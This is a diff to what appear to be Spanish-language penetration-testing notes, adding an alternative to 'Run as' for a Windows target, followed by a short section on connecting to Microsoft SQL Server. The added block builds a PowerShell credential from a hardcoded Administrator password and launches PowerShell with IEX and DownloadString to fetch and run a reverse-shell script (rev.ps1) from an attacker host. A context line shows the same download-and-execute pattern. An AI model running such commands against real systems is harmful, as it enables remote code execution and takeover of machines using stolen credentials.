@@ -2487,6 +2487,16 @@ Invoke-Command -ScriptBlock { IEX(New-Object Net.WebClient).downloadString('http
 
 ```
 
+Otra opcion a Run as que me funciono
+
+```
+$SecPass = ConvertTo-SecureString 's67u84zKq8IXw' -AsPlainText -Force
+
+$cred = New-Object System.Management.Automation.PSCredential('Administrator',$SecPass)
+
+Start-Process -FilePath "powershell" -argumentlist "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.21:8084/rev.ps1')" -Credential $cred
+```
+
 ## Microsoft SQL server
 
 Para conectarse desde Kali existe un script en python de impacket. En Microsoft SQL Server, el usuario administrador por defecto se llama "sa", que es la abreviatura de "System Administrator"
